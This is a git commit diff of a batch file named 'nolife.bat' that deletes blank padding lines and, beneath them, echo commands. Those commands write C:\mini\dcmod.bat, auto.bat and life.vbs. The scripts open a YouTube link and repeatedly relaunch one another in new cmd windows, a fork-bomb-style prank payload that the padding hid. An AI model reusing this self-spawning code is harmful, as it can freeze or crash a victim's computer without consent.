93d991a915a281b19bb5e54f85981c65e3d137e1
Jonahgus <102358877+Jonahgus@users.noreply.github.com>
2022-05-11 12:58:35 +0200

    Update nolife.bat

--- nolife.bat
+++ nolife.bat
@@ -6,48 +6,5 @@ timeout 2
 
 
 
+ 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-echo @echo off>"C:\mini\dcmod.bat
-echo set url="https://www.youtube.com/watch?v=lXWM7gt86E4">>"C:\mini\dcmod.bat"
-echo start chrome.exe %url%>>"C:\mini\dcmod.bat"
-echo start cmd.exe /k "C:\mini\dcmod.bat">>"C:\mini\dcmod.bat"
-
-echo @echo off>"C:\mini\auto.bat
-echo start cscript "C:\mini\life.vbs">>"C:\mini\auto.bat"
-echo start cmd.exe /k "C:\mini\dcmod.bat">>"C:\mini\auto.bat"
-
-echo CreateObject("WScript.Shell").Run("C:\\mini\\dcmod.bat")>"C:\mini\life.vbs
-echo CreateObject("WScript.Shell").Run("C:\\mini\\auto.bat")>>"C:\mini\life.vbs"
